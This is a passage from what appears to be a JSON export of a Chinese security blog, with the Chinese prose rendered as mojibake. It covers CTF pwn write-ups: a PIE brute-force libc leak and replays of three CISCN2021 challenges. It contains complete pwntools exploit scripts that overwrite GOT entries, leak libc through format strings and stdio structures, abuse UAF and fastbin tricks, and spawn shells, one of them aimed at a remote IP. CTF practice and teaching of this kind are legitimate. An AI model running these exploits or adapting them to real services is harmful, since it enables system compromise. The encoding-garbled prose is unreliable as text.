ˆçš„éšæœºåŒ–ï¼Œæˆ‘ä»¬å¦‚æœéšæ„ä¿®æ”¹rbpé‚£ä¹ˆå°±ä¼šæ‰“å°å‡ºå¥‡æ€ªçš„ä¸œè¥¿ï¼Œæ‰€ä»¥ä¿®æ”¹rbpçš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œä½¿å¾—[rbp+var_34]èƒ½å¤Ÿç§»åŠ¨ä¸€å®šèŒƒå›´ï¼Œä»¥ä¸€å®šå‡ ç‡å‘½ä¸­æ ˆé¡¶ä¸Šæ–¹ã€‚è€Œåˆç”±äºæ˜¯é€’å½’è°ƒç”¨ï¼Œç¬¬ä¸€å…³çš„æ ˆåœ¨ç¬¬äºŒå…³çš„æ ˆçš„ä¸Šæ–¹ï¼Œæ¨¡å‹å¤§è‡´å¦‚ä¸‹ï¼š\n\n(1)ç¬¬ä¸€æ¬¡rbpå’Œrspä»¥åŠç¬¬äºŒæ¬¡çš„å¦‚å›¾ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532743.png)  ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532872.png)\n\n(2)ç¬¬ä¸€æ¬¡æ ˆä»¥åŠç¬¬äºŒæ¬¡æ ˆå¦‚å›¾ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532846.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191532270.png)\n\nâ–²è¿™é‡Œç”¨çš„æ˜¯Libc-2.32çš„ï¼Œç”¨å…¶ä»–çš„Libcå°±ä¸å¤ªä¸€æ ·ï¼Œå…·ä½“æƒ…å†µå…·ä½“åˆ†æã€‚\n\n6.è¿™é‡Œçš„æ¨¡å‹æ˜¯å‡è®¾ç¬¬ä¸€æ¬¡çš„rspæ ˆé¡¶åä¸¤ä½ä¸º00ï¼Œä½†æ˜¯ç”±äºæ ˆåœ°å€éšæœºåŒ–ï¼Œæ‰€ä»¥rspå…¶å®å¯ä»¥ä»0x00-0xFFä¹‹é—´å˜åŒ–ï¼Œå¯¹åº”çš„åœ°å€ä¹Ÿå°±æ˜¯ä»0-31ä¹‹é—´å˜åŒ–ã€‚\n\n7.è¿™é‡Œå…ˆè€ƒè™‘ç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œrbp-var34å¦‚ä½•è½åˆ°libcç©ºé—´ä¸­ï¼Œä¹Ÿå°±æ˜¯å½“0å¾€ä¸‹ç§»åŠ¨ï¼Œå˜åŒ–ä¸ºå¤§çº¦æ˜¯4æˆ–è€…5æ—¶ï¼Œå³å¯è½åˆ°libcç©ºé—´ã€‚åŒæ ·çš„ï¼Œä»5-16å˜åŒ–ï¼Œéƒ½å¯ä»¥ä½¿å¾—rbp-var34è½åœ¨libcç©ºé—´ã€‚ä½†æ˜¯å¦‚æœ0å˜åŒ–æˆ16ä»¥ä¸Šï¼Œå¯¹åº”çš„ç¬¬äºŒæ¬¡æ ˆç©ºé—´rbpå°±ä¼šå˜æˆ32ä»¥ä¸Šï¼Œæ¢ç®—æˆ16è¿›åˆ¶ä¸º0x100ï¼Œè¿™æ—¶ä¿®æ”¹æœ€åä¸¤ä½ï¼Œå°±ä¼šå˜æˆ0x15cï¼Œä½¿å¾—å®ƒä¸ä½†ä¸å¾€ä¸Šèµ°ï¼Œæ›´ä¼šå¾€ä¸‹èµ°ï¼Œä»è€Œæ²¡åŠæ³•è½åˆ°libcç©ºé—´ã€‚æ€»è€Œè¨€ä¹‹ï¼Œæ…¢æ…¢ç ”ç©¶ä¸‹ï¼Œç„¶åè®¡ç®—æ¦‚ç‡å¤§çº¦ä¸º12/32=3/8ï¼Œå¯ä»¥ä½¿å¾—è½åœ¨Libcç©ºé—´ã€‚è¿™é‡Œçš„5cå¯ä»¥æ”¹å˜æˆå…¶å®ƒå€¼xï¼Œä½†æ˜¯éœ€è¦x-0x34ä¸º8çš„å€æ•°æ‰è¡Œï¼Œä¸ç„¶å–åˆ°çš„åœ°å€ä¼šæ˜¯æˆªæ–­çš„ï¼Œä½†æ˜¯ä¿®æ”¹åæˆåŠŸæ¦‚ç‡ä¼šå‘ç”Ÿæ”¹å˜ï¼Œå› ä¸º0x5cæ‰«åˆ°çš„åœ°å€èŒƒå›´å¤§æ¦‚å°±æ˜¯libcçš„æ ˆç©ºé—´ã€‚\n\n8.è½åœ¨libcç©ºé—´ä¸ä»£è¡¨ä¸€å®šå°±ä¼šè½åœ¨æŒ‡å‘Libcåœ°å€ä¸Šï¼Œå‰é¢å¯ä»¥çœ‹åˆ°ï¼Œåœ¨16ä¸ªåœ°å€èŒƒå›´å†…å¤§æ¦‚ä¸º7ä¸ªï¼Œä¹Ÿå°±æ˜¯1/2çš„æ¦‚ç‡æˆåŠŸã€‚ç„¶åç”±äºæœ‰v2%a1è¿™ä¸ªè¿ç®—ï¼Œä¹Ÿå°±å¯¹åº”æ±‡ç¼–ä»£ç idiv   [rbp+var_34]ï¼Œè¿™å°±å¯¼è‡´å¦‚æœrbp+var_34çš„æ•°æ®ä¸º0é‚£ä¹ˆå°±ä¼šäº§ç”Ÿé™¤é›¶æ“ä½œï¼Œè¿™é‡Œæ²¡åŠæ³•å»æ‰ã€‚éœ€è¦è¿›è¡Œtryæ“ä½œæ¥å»é™¤è¿™ä¸ªé”™è¯¯ï¼Œä½¿ç¨‹åºé‡æ–°è¿è¡Œï¼Œè¿›è¡Œè‡ªåŠ¨åŒ–çˆ†ç ´ã€‚åŒæ—¶æ³„éœ²å‡ºæ¥çš„åœ°å€ä¼šå‘ç°æœ‰æ—¶å€™æ˜¯æ­£æ•°æœ‰æ—¶å€™æ˜¯è´Ÿæ•°ã€‚è¿™æ˜¯å› ä¸ºæˆ‘ä»¬åªèƒ½æ³„éœ²å‡ºåœ°å€çš„ä½32ä½ï¼Œä½8ä¸ªåå…­è¿›åˆ¶æ•°ã€‚è€Œè¿™ä¸ªæ•°çš„æœ€é«˜ä½å¯èƒ½æ˜¯0æˆ–è€…1ï¼Œè½¬æ¢æˆæœ‰ç¬¦å·æ•´æ•°å°±å¯èƒ½æ˜¯æ­£è´Ÿä¸¤ç§æƒ…å†µã€‚è¿™é‡Œè¿›è¡Œå¤„ç†å¯é¿å…æˆåŠŸç‡ä¸‹é™ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nif addr_l8 < 0:\naddr_l8 = addr_l8 + 0x100000000\n```\n\n9.ä½†æ˜¯æ³„éœ²å‡ºæ¥çš„åœ°å€ç”±äºprintfçš„å‚æ•°æ˜¯%dï¼Œæ‰€ä»¥æ‰“å°å‡ºæ¥çš„æ˜¯32ä½åœ°å€ï¼Œè¿˜éœ€è¦çŒœå‰©ä¸‹32ä½ã€‚ä½†æ˜¯è¿™é‡Œæœ‰ä¸ªæŠ€å·§ï¼Œè²Œä¼¼æ‰€æœ‰64ç¨‹åºåŠ è½½åçš„ä»£ç æ®µåœ°å€éƒ½åœ¨0x000055XXXXXXXXXX-0x000056XXXXXXXXXXä¹‹é—´å¾˜å¾Šï¼Œå¯¹åº”çš„libcåŠ è½½æ®µåœ¨0x00007EXXXXXXXXXX-0x00007FXXXXXXXXXXèŒƒå›´ï¼Œä»¥ä¸‹æ˜¯æµ‹è¯•æ•°æ®ï¼š\n\nç¨‹åºå¼€å¤´æ®µ.loadé¦–åœ°å€å’Œdebugæ®µé¦–åœ°å€ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n00007F1301D2A000  \n000056238FCAB000\nå·®å€¼ä¸º28EF 7207 F000\n\n00007FCB31061000\n000055D513E06000\nå·®å€¼ä¸º29F6 1D25 B000\n\n00007F58EFF09000\n000055F7C1BEC000\nå·®å€¼ä¸º2983 DC10 3000\n```\n\nå…·ä½“åŸç†å¥½åƒæ˜¯PIEæºä»£ç éšæœºçš„å…³ç³»ï¼Œä½†å…·ä½“ä¸å¤ªæ¸…æ¥šï¼Œèƒ½ç”¨å°±è¡Œã€‚æ‰€ä»¥é«˜32ä½å°±å¯ä»¥å‡è®¾åœ°å€ä¸º0x00007fxxï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦çˆ†ç ´0x1ffå¤§å°ï¼Œä¹Ÿå°±æ˜¯511ï¼Œç›¸å½“äº512æ¬¡ï¼Œä½†æ˜¯å…¶å®å¯ä»¥çŸ¥é“ï¼Œå¤§æ¦‚ç‡æ˜¯è½åœ¨0x7fé‡Œï¼Œçœ‹æ•°æ®åˆ†æä¹Ÿå¯ä»¥çŸ¥é“ï¼Œæ‰€ä»¥å®é™…çˆ†ç ´æ¬¡æ•°åŸºæœ¬åœ¨500æ¬¡ä»¥å†…ã€‚æ‰€ä»¥å°†æ³„éœ²å‡ºæ¥çš„åœ°å€åŠ ä¸Šä¸€ä¸ªåœ¨0x7fé‡Œçš„å€¼ï¼Œä¹Ÿå°±æ˜¯addr = addr_l8 + 0x7f8b00000000ï¼Œä¹‹åå†æ ¹æ®Libcç©ºé—´ä¸­æŒ‡å‘libcåœ°å€çš„åä¸¤ä½æ¥åŒºåˆ†åœ°å€ï¼šå¹¶å‡å»åœ¨libcä¸­æŸ¥åˆ°çš„åç§»é‡å³å¯å¾—åˆ°LibcåŸºåœ°å€ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nif hex(addr)[-2:] == '0b': #__IO_file_overflow+EB\nlibc_base = addr - 0x7c90b\n\nelif hex(addr)[-2:] == 'd2': #puts+1B2\nlibc_base = addr - 0x70ad2\n\nelif hex(addr)[-3:] == '600':#_IO_2_1_stdout_\nlibc_base = addr - 0x3c2600\n\nelif hex(addr)[-3:] == '400':#_IO_file_jumps\nlibc_base = addr - 0x3be400\n\nelif hex(addr)[-2:] == '83': #_IO_2_1_stdout_+83\nlibc_base = addr - 0x3c2683\n\nelif hex(addr)[-2:] == '32': #_IO_do_write+C2\nlibc_base = addr - 0x7c370 - 0xc2\n\nelif hex(addr)[-2:] == 'e7': #_IO_do_write+37\nlibc_base = addr - 0x7c370 - 0x37\n```\n\næ‰€ä»¥ç®—ä¸Šå‘½ä¸­æ¦‚ç‡ï¼Œå…¶å®è°ƒè¯•çš„æ—¶å€™å¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸€å…³çš„æ ˆç©ºé—´ä¸­ç”±äºç¨‹åºè¿è¡Œç»“æœä¹Ÿä¼šæœ‰å‡ ä¸ªæŒ‡å‘Libcåœ°å€ï¼ŒåŠ ä¸Šè¿™å‡ ä¸ªä¹Ÿå¯ä»¥æé«˜æˆåŠŸç‡ï¼Œå› ä¸ºä¿®æ”¹çš„rbpä¹Ÿæ˜¯æœ‰å¯èƒ½è½åœ¨ç¬¬ä¸€å…³çš„æ ˆç©ºé—´ã€‚æ€»çš„çˆ†ç ´æ¬¡æ•°åº”è¯¥å°±æ˜¯500/((1/2)*(3/8))ï¼Œçº¦ä¸º2500æ¬¡ï¼Œè¿˜èƒ½æ¥å—ã€‚\n\n10.æ³„éœ²å‡ºLibcåœ°å€ä¹‹åä¸€èˆ¬å°±æœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯åˆ©ç”¨æ ˆæº¢å‡ºï¼Œè°ƒç”¨ä¸‡èƒ½gadgetç”¨systemå‡½æ•°è¿›è¡Œbinshå­—ç¬¦ä¸²èµ‹å€¼ï¼Œä»è€Œgetshellã€‚è¿˜æœ‰ä¸€ç§å°±æ˜¯ï¼Œåˆ©ç”¨one_gadgetæ¥getshellï¼Œé€šè¿‡æŸ¥çœ‹E43è¿”å›æ—¶çš„æ±‡ç¼–ä»£ç æœ‰ä¸€ä¸ªmove eax,0ï¼›æ»¡è¶³libc-2.23.soçš„å…¶ä¸­ä¸€ä¸ªone_gadgetçš„æ¡ä»¶ï¼Œé‚£ä¹ˆç›´æ¥ç”¨å°±è¡Œã€‚\n\n11.æœ€ålibcåŸºåœ°å€åŠ ä¸Šone_gadgetçš„åç§»åœ°å€å°±å¯ä»¥å¾—åˆ°one_gadgetçš„å®é™…åœ°å€ã€‚\n\none_gadget = libc_base + 0x45526\n\nä¹‹ååœ¨ç¬¬äºŒå…³ä¸­å†æ¬¡è¿›è¡Œæ ˆæº¢å‡ºè¦†ç›–ripæ¥è·³è½¬åˆ°one_gadgetå³å¯getshellã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["PIE"],"categories":["PWN","PIE0x7"]},{"title":"CISCN2021ä¸œåŒ—èµ›åŒºå¤ç°","url":"/2021/08/14/CISCN2021ä¸œåŒ—èµ›åŒºå¤ç°/","content":"\nå¤ç°ä¹‹å‰ï¼Œå…ˆéª‚ä¸¤å¥ã€‚SBå½¢å¼ï¼ŒSBçš„è‡ªå·±ã€‚\n\n1.hard:è¿™é“é¢˜ç›®æœ€ä»–ä¸«SBï¼Œä¸Šæ¥è¿è¡Œä¸èµ·æ¥ï¼Œç¯å¢ƒè°ƒåŠå¤©ï¼Œè¿˜æ˜¯è¿è¡Œä¸èµ·æ¥ï¼Œå†åŠ ä¸ŠVPNå´©æºƒï¼Œä¸€ç›´è¿ä¸ä¸Šï¼Œè¿˜ä»¥ä¸ºé¢˜ç›®æœ¬èº«ä¼˜ç‚¹é—®é¢˜ï¼Œåªèƒ½å…ˆæ”¾å¼ƒï¼Œè½¬å¤´å¸®å¿™å»äº†ã€‚åæ¥checksecä¸€ä¸‹æ‰å‘ç°ä¾èµ–æ˜¯./lib/ï¼Œä¹Ÿå°±æ˜¯å½“å‰æ–‡ä»¶ä¸‹éœ€è¦åˆ›å»ºä¸€ä¸ªlibæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æ”¾ä¸Šld-linux-x86-64.so.2æ‰èƒ½è¿è¡Œï¼Œæˆ‘å¯å»ä»–å¤§çˆ·çš„ã€‚\n\nç»™çš„åˆ†æŒºé«˜ï¼Œåé¢æƒ³äº†æƒ³ä¹Ÿä¸ç®—éš¾ï¼Œä¸»è¦æœ‰ä¸‰ä¸ªç‚¹ã€‚\n\n(1)ä»»æ„å†™æ—¶ä¿®æ”¹çš„åœ°æ–¹é€‰æ‹©ã€‚\n\n(2)callocä¼ å…¥çš„nnumä¸º0æ—¶ï¼Œä¸ä¼šç”³è¯·ï¼Œä¼šè¿”å›0ã€‚åŒæ ·ä¹Ÿå…·å¤‡mmapçš„åŠŸèƒ½ã€‚\n\n(3)æœ€å¼€å§‹åˆå§‹åŒ–çš„æ—¶å€™ï¼Œsetbufä¼ å…¥çš„æ˜¯_IO_2_1_stdxxçš„ç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“åœ¨è°ƒç”¨scanfï¼Œgetï¼Œprintfç­‰éœ€è¦åˆå§‹åŒ–ç¼“å†²åŒºçš„å‡½æ•°æ—¶ï¼Œä¼šå†™å…¥ç¼“å†²åŒºåœ°å€ï¼Œä¹Ÿå°±æ˜¯Libcä¸ŠæŸä¸ªåŒºåŸŸï¼Œå¯ä»¥å€Ÿæ­¤è”åˆsetbufæ¥æ³„éœ²åœ°å€ã€‚\n\næ¯”èµ›åå’Œå­¦é•¿äº¤æµä¸€ä¸‹ï¼Œæ‰æƒ³åˆ°æŠŠæœ€åçš„putsæ”¹æˆmainï¼Œæˆ‘çœŸä»–ä¸«æ˜¯ä¸ªSBï¼Œç„¶åå°±å¾ˆæ­£å¸¸äº†ã€‚\n\nâ‘ ç”±äºPartial Reloadï¼Œå¯ä»¥æ”¹gotè¡¨ï¼Œæ‰€ä»¥å…ˆä»»æ„å†™ï¼Œå°†putsæ”¹æˆmainï¼Œå¾ªç¯ç¨‹åºã€‚\n\nâ‘¡å°†exitæ”¹æˆinitå¤„çš„setbufçš„åœ°æ–¹ï¼Œå°†setbufæ”¹æˆprintfï¼Œè¿™æ ·å†è¿›å…¥initçš„åœ°æ–¹æ—¶ï¼Œå°±ä¼šæ‰“å°å¤„_IO_2_1_stdxxçš„ç»“æ„ä½“çš„å€¼ã€‚\n\nâ‘¢ç”±äºæ‰“å°_IO_2_1_stdxxçš„ç»“æ„ä½“çš„å€¼æ—¶ï¼Œæ‰“å°å¤„flagä¹‹åå°±ä¼šè¢«0x00æˆªæ–­ï¼Œæ‰€ä»¥éœ€è¦ä¿®æ”¹flagå¤„çš„å€¼ã€‚è¿™é‡Œé€šè¿‡callocè¾“å…¥è¿‡å¤§çš„nnumæ—¶ä¼šä»mmapç”³è¯·å†…å­˜ï¼Œè¿”å›çš„æ˜¯mmapç©ºé—´ï¼Œä¹Ÿå°±æ˜¯libcä¸Šçš„åœ°å€ã€‚åŒæ—¶ç”±äºå…³é—­äº†PIEï¼Œåç§»ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œæ‰€ä»¥ç›´æ¥è°ƒè¯•è®¡ç®—åç§»å³å¯ã€‚\n\nâ‘£æ³„éœ²åœ°å€åï¼ŒåŒæ ·åˆ©ç”¨callocç”³è¯·mmapçš„æ–¹æ³•ï¼Œå°†calloc_gotæ”¹æˆone_gadgetå³å¯ã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\nbinary = \"./pwn\"\nlibc_file = \"/lib/x86_64-linux-gnu/libc-2.31.so\"\n#libc_file = \"\"\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\n#libcsearcher use\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\n\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(['./lib/ld-linux-x86-64.so.2', './tvstation'], env={\"LD_PRELOAD\":\"./lib/libc.so.6\"})\n    #p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"119.3.81.43\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\n\ndef write(offset, con):\n    ru(\": \")\n    sl(\"-1\")\n    ru(\": \")\n    sl(str(offset // 4))\n    ru(\":\")\n    sl(str(con))\n\ndef write2(offset, con):\n    ru(\": \")\n    sl(str(0x100000))\n    ru(\": \")\n    sl(str(offset // 4))\n    ru(\":\")\n    sl(str(con))\n\n\nmain_addr = 0x40078D\nputs_got = elf.got['puts']\nsetbuf_got = elf.got['setbuf']\nexit_got = elf.got['exit']\nprintf_plt = elf.plt['printf']\nsetbuf_plt = elf.plt['setbuf']\ncalloc_got = elf.got['calloc']\nsetbuf_init = 0x40086a\n\n\nlog.info(\"puts_got:0x%x\"%puts_got)\nlog.info(\"setbuf_got:0x%x\"%setbuf_got)\nlog.info(\"exit_got:0x%x\"%exit_got)\nlog.info(\"printf_plt:0x%x\"%printf_plt)\nlog.info(\"setbuf_plt:0x%x\"%setbuf_plt)\nlog.info(\"calloc_got:0x%x\"%calloc_got)\n\n\nwrite(puts_got,main_addr) #puts->main\nwrite(setbuf_got,printf_plt) #setbuf->printf\nwrite(setbuf_got+4,\"0\") #setbuf->printf\nwrite(exit_got,setbuf_init) #exit->setbuf\n\n\n# gdb.attach(p, \"b *(0x400854) \\n c\")\nIO_stdin4_mmap = 0x5EC974 #without PIE\nIO_stdin_1_libc = 0x1EBA03\nwrite2(IO_stdin4_mmap,0x11111111) #IO_stdin.flag->0x111111111fbad208b\nsla(': ', str(256))\nleak = u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8, \"\\x00\"))\nlibc_base = leak - IO_stdin_1_libc\nlog.info(\"libc_base:0x%x\"%libc_base)\none_gadget = libc_base + 0xe6c81\n\nru(\": \")\nsl(\"0\")\nru(\":\")\nsl(\"0\")\n\nwrite(calloc_got, one_gadget & 0xffffffff)\nru(\": \")\nsl(str(0))\np.interactive()\n```\n\n2.giftï¼šè¿™é“é¢˜ç›®æˆ‘è®¤æ ½ï¼Œç¡®å®æ˜¯åšé¢˜ç»éªŒå°‘äº†ï¼Œå¿˜äº†åˆ©ç”¨chunkå¤´+chunkè”åˆfastbinçš„FILOåŸåˆ™æ¥ä¿®æ”¹chunkå¤´äº†ã€‚\n\n(1)æ”¹chunkå¤´ï¼ŒåŠ ä¸ŠUAFæ¼æ´ï¼Œåˆ©ç”¨chunkå¤´é‡Œçš„å‡½æ•°æŒ‡é’ˆå’Œå‚æ•°ï¼Œæ”¹æˆprintfï¼Œç›´æ¥æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²åœ°å€ã€‚\n\n(2)åŒæ ·é“ç†ï¼Œç›´æ¥æ”¹å‡½æ•°æŒ‡é’ˆæŒ‡å‘å †ä¸Šä¼ªé€ çš„system_addrï¼Œåˆ©ç”¨å‚æ•°/bin/shç›´æ¥getshellã€‚\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./GIFT\"\nlibc_file = \"/lib/x86_64-linux-gnu/libc-2.23.so\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.27.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = main_arena-0x18\n#32bit:main_arena+56(unsortedbin_addr)\n#64bit:main_arena+96(unsortedbin_addr)//88 aslo have\n'''\nmalloc_hook = main_arena-0x10\nobj = LibcSearcher(\"__malloc_hook\", malloc_hook)\nobj = LibcSearcher(\"fgets\", 0Xd90)\nlibc_base = fgets-obj.dump('fgets')\nsystem_addr = libc_base + obj.dump(\"system\") #system\nbinsh_addr = libc_base + obj.dump(\"str_bin_sh\")\nlog.info(\"system_addr:0x%x\"%system_addr)\n'''\n\n#malloc_hook,main_aren Find\n'''\npython2 LibcOffset.py libc-2.23.so\n'''\n\n#without stripped\n'''\nputs_got = elf.got['puts']\nputs_plt = elf.plt['puts']\nsystem_plt = elf.plt['system']\nread_plt = elf.plt['read']\nmain_addr = elf.sym['main']\nfree_hook = libc_base + libc.sym['__free_hook']\nsystem_addr = libc_base + libc.sym['system']\nbinsh_addr = libc_base + libc.search('/bin/sh').next()\n'''\n\n\n#usually gadget:\n'''\nu_gadget1 = elf.sym['__libc_csu_init'] + 0x5a\nu_gadget2 = elf.sym['__libc_csu_init'] + 0x40\npop_rdi_ret = elf.sym['__libc_csu_init'] + 0x63\nret = elf.sym['__libc_csu_init'] + 0x64\n'''\n\n\nlocal = 1\nif local:\n    p = process(binary)\n    #p = process(binary, env={\"LD_PRELOAD\":\"./libc.so.6\"})\n    elf = ELF(binary)\n    libc = ELF(libc_file)\nelse:\n    p = remote(\"node3.buuoj.cn\",\"49153\")\n    elf = ELF(binary)\n    libc = ELF(libc_file)\n\nsd = lambda s:p.send(s)\nsl = lambda s:p.sendline(s)\nrc = lambda s:p.recv(s)\nru = lambda s:p.recvuntil(s)\nrl = lambda :p.recvline()\nsa = lambda a,s:p.sendafter(a,s)\nsla = lambda a,s:p.sendlineafter(a,s)\n\nmenu = \">> \"\n\n\ndef add(size, con):\n    sla(menu, \"1\")\n    sla(\"size: \", str(size))\n    sa(\"content: \", con)\n\n\ndef delete(idx):\n    sla(menu, \"2\")\n    sla(\"index: \", str(idx))\n\nadd(0x28, \"\\x00\") #0\nadd(0x28, \"\\x01\") #1\n\ndelete(0)\ndelete(1)\n\nadd(0x18, \"%8$p%9$p\"+\"\\x30\") #2\ndelete(0)\nru(\"0x\")\nheap_base = int(p.recv(12),16)-0x10\nlibc_base = int(p.recv(14),16) - 0x55810\n# li(\"libc_base\", libc_base)\n# li(\"leak\", leak)\nlog.info(\"heap_base:0x%x\"%heap_base)\nlog.info(\"libc_base:0x%x\"%libc_base)\n\nsystem_addr = libc_base + libc.sym['system']\n\nadd(0x38, \"\\x03\") #3\nadd(0x38, \"\\x04\") #4\nadd(0x48,p64(system_addr))#5\n\nheap_system = heap_base+0x50+0x50+0x60+0x60+0x20+0x10\ndelete(3)\ndelete(4)\nadd(0x18,\"/bin/sh\\x00\"+p64(heap_system)) #6\ndelete(3)\np.interactive()\n```\n\n \n\n3.small_chunkï¼šæˆ‘è§‰å¾—å‡ºå¾—æœ€å¥½çš„æ˜¯è¿™é“é¢˜ï¼Œç¡®å®ä¸é”™ã€‚\n\n(1)é¦–å…ˆå¸ƒå±€ï¼Œåˆ©ç”¨off-by-oneåˆ¶ä½œå †å—é‡å ï¼Œç„¶åunsortedbinæ³„éœ²åœ°å€ã€‚\n\n(2)ç”±äºchunkåªèƒ½ç”³è¯·0x20å’Œ0x30ï¼Œæ‰€ä»¥æƒ³è¦æ‰“fastbin attackï¼Œä¸€èˆ¬æœ‰ä»¥ä¸‹ä¸‰ç§æ–¹æ¡ˆæ¥ç»•è¿‡ï¼š\n\nâ‘ è°ƒç”¨malloc_consolidateï¼Œæ•´ç†fastbinä¸­çš„chunkï¼Œä½¿å¾—fake_chunkçš„sizeå˜æˆåˆæ³•çš„ã€‚è¿™ä¸ªæœ‰ä¸‰ç§æƒ…å†µï¼Œå…·ä½“åˆ†æï¼Œæˆ‘éƒ½å°è¯•äº†ä¸ªéï¼Œè¿™é‡Œä¸€ä¸ªä¹Ÿç”¨ä¸äº†ã€‚\n\nâ‘¡åˆ©ç”¨unsotedbin attackï¼Œä¸è¿‡è¿™ä¸ªåªèƒ½é’ˆå¯¹0x7fçš„æƒ…å†µï¼Œè¿™é‡Œä¸å¤ªè¡Œã€‚\n\nâ‘¢åˆ©ç”¨fastbinYé“¾è¡¨ï¼Œå…ˆä¼ªé€ ä¸€ä¸ªfastbin_chunkçš„fdä¸º0x21æˆ–è€…0x31ï¼Œç”³è¯·å›æ¥fastbin_chunkï¼Œå°†0x21æˆ–è€…0x31ç•™åˆ°fastbinYé“¾è¡¨ä¸­ï¼Œè¿™æ ·åœ¨main_arenaä¸­å°±ç•™ä¸‹äº†ä¸€ä¸ª0x21æˆ–è€…0x31çš„æ•°å€¼ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ•°å€¼ä¼ªé€ sizeæ¥ç”³è¯·chunkåˆ°main_arenaã€‚ä¹‹å0x20å’Œ0x30çš„fastbinæ‰“é…åˆï¼Œå°†top_chunkåœ°å€æ”¹æˆmalloc_hookçš„åœ°æ–¹ï¼Œå†ç”³è¯·å°±å¯ä»¥ç”³è¯·åˆ°malloc_hookäº†ã€‚\n\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œtop_chunkæ”¹åœ°å€ï¼Œéœ€è¦ç»•è¿‡ä¸€äº›æ£€æµ‹ï¼Œæ‰€ä»¥ä¸€èˆ¬ä¸¤ç§æƒ…å†µï¼š\n\nA.free_hook-0xb58\n\nB.malloc_hook-0x10\n\nä»¥ä¸Šä¸¤ç§çš„sizeåŸŸéƒ½æ˜¯ä¸€ä¸ªlibcåœ°å€ï¼Œèƒ½å¤Ÿé€šè¿‡æ£€æµ‹\n\nè¿™é‡Œç”±äºå †å—ä¸ªæ•°ä¸å¤Ÿç”¨ï¼Œæ‰€ä»¥é€‰æ‹©æ–¹æ¡ˆBï¼Œä¿®æ”¹å®Œmalloc_hookä¸ºone_gadgetåï¼Œå†ç”³è¯·å³å¯getshellã€‚\n\nâ–²è¿™é‡Œåœ¨åé¢çš„å¤ç°ä¸­æœ‰ç‚¹çŠ¯è ¢ï¼Œæœ¬æ¥æƒ³ç”³è¯·åˆ°bssæ®µä¸Šçš„ï¼Œæ²¡åŠæ³•æ³„éœ²elfåŸºåœ°å€ã€‚vmmapä¸€çœ‹ï¼Œå‘ç°heap_baseå’Œbssæ®µå›ºå®šåç§»0x1000ï¼Œè¿™å¯ç»™æˆ‘é«˜å…´åäº†ï¼Œç›´æ¥æ‰“bssæ®µçš„sizeåŒºåŸŸçš„åœ°æ–¹ã€‚æ‰“å®Œåï¼Œå…³æœºä¹‹åï¼Œå†æ‰“å¼€å‘ç°ä¸é¡¶ç”¨äº†ã€‚å¾—ï¼ŒASLRæˆ‘ä¹‹å‰ç»™å…³äº†ï¼Œå†å¼€å°±ä¸æ˜¯å›ºå®šåç§»äº†.....\n\n```python\n# -*- coding:UTF-8 -*-\nfrom pwn import *\n#from LibcSearcher import *\n#context.log_level = 'debug'\n\n#context\ncontext.arch = 'amd64'\nSigreturnFrame(kernel = 'amd64')\n\n\nbinary = \"./small_chunk\"\nlibc_file = \"./libc.so.6\"\n#libc_file = \"/lib/x86_64-linux-gnu/libc-2.23.so\"\n#libc_file = \"\"\n\n#libcsearcher use\n#32bit:malloc_hook = 